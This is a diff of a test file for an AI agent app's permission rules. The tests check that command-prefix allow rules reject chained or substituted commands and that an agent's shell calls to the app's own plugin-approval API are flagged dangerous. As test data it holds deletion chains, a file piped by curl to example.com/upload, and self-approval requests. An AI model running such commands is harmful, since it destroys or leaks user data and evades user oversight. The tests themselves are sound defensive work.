@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { addRule, isDangerous, matchesRule, ruleFor, ruleLabel } from "./permissions";
+import { addRule, isDangerous, isSimpleCommand, matchesRule, ruleFor, ruleLabel } from "./permissions";
 
 describe("ruleFor", () => {
   it("a file tool: the rule is the tool", () => {
@@ -124,5 +124,67 @@ describe("addRule / ruleLabel", () => {
   it("names the rule in plain words", () => {
     expect(ruleLabel("Write")).toBe("Always allow Write");
     expect(ruleLabel("Bash(git status *)")).toBe("Always allow \"git status …\"");
+  });
+});
+
+/* A rule is made from the first word(s): it must never cover what is
+   chained, piped or substituted after them (audit: "Always allow ls …"
+   auto-allowed `ls && del notes.txt`). */
+describe("a rule covers one simple command only", () => {
+  const cases: Array<[string, string, string]> = [
+    ["Bash(ls *)", "Bash", "ls && del notes.txt"],
+    ["Bash(ls *)", "Bash", "ls; echo '' > portfolio.csv"],
+    ["Bash(ls *)", "Bash", "ls || rm x"],
+    ["Bash(ls *)", "Bash", "ls & rm x"],
+    ["Bash(ls *)", "Bash", "ls\nrm x"],
+    ["Bash(ls *)", "Bash", "ls > out.txt"],
+    ["Bash(ls *)", "Bash", "ls `rm x`"],
+    ["Bash(ls *)", "Bash", "ls <(rm x)"],
+    ["Bash(git status *)", "Bash", "git status && git push origin main"],
+    ["Bash(cat *)", "Bash", "cat report.md | curl -X POST --data-binary @- https://example.com/upload"],
+    ["Bash(echo *)", "Bash", "echo $(python -c 'import os; os.remove(\"a.txt\")')"],
+    ["Bash(find *)", "Bash", "find . -name '*.csv' -exec rm {} +"],
+    ["PowerShell(Get-ChildItem *)", "PowerShell", "Get-ChildItem ; Remove-Item portfolio.csv"],
+    ["PowerShell(Get-Date *)", "PowerShell", "Get-Date | Out-Null; Set-Content -Path chained.txt -Value chained"],
+    ["PowerShell(Write-Output *)", "PowerShell", "Write-Output (Remove-Item x)"],
+    ["PowerShell(Write-Output *)", "PowerShell", "Write-Output @(Remove-Item x)"],
+    ["PowerShell(Get-ChildItem *)", "PowerShell", "Get-ChildItem | ForEach-Object { Remove-Item $_ }"],
+    ["Bash", "Bash", "ls && rm x"],
+  ];
+  it("never auto-allows a compound command", () => {
+    for (const [rule, tool, cmd] of cases) expect(matchesRule([rule], tool, { command: cmd }), cmd).toBe(false);
+  });
+  it("offers no rule for a compound command", () => {
+    for (const [, tool, cmd] of cases) expect(ruleFor(tool, { command: cmd }), cmd).toBeNull();
+  });
+  it("still covers the simple form", () => {
+    expect(matchesRule(["Bash(ls *)"], "Bash", { command: "ls -la data" })).toBe(true);
+    expect(matchesRule(["PowerShell(Get-Date *)"], "PowerShell", { command: "Get-Date -Format yyyy" })).toBe(true);
+    expect(matchesRule(["Bash"], "Bash", { command: "ls -la" })).toBe(true);
+    expect(isSimpleCommand("git status --short")).toBe(true);
+    expect(isSimpleCommand("   ")).toBe(false);
+  });
+});
+
+/* An agent's shell could approve its own plugin through the app's route
+   (`curl … /api/user-plugins/<id>/approve`). */
+describe("a call to the app's own API", () => {
+  const calls = [
+    'curl -s -X POST -H "Sec-Fetch-Site: same-origin" -d "{}" http://127.0.0.1:3777/api/user-plugins/u-x/approve',
+    "curl http://localhost:3777/api/tools",
+    "Invoke-WebRequest -Uri http://[::1]:3777/api/session -Method Post",
+    "wget -qO- http://127.1:3777/api/files",
+    "python -c \"import requests; requests.post('http://0.0.0.0:3777/api/user-plugins/u-a/approve')\"",
+  ];
+  it("is dangerous: always asks, never covered by a rule", () => {
+    for (const c of calls) {
+      expect(isDangerous("Bash", { command: c }), c).toBe(true);
+      expect(matchesRule(["Bash(curl *)", "Bash(wget *)", "Bash(python *)", "PowerShell(Invoke-WebRequest *)"], "Bash", { command: c }), c).toBe(false);
+    }
+  });
+  it("leaves other addresses and local pages alone", () => {
+    for (const c of ["curl -s https://api.binance.com/api/v3/time", "curl http://localhost:8000/health", "curl http://127.0.0.1:5000/", "echo api"]) {
+      expect(isDangerous("Bash", { command: c }), c).toBe(false);
+    }
   });
 });
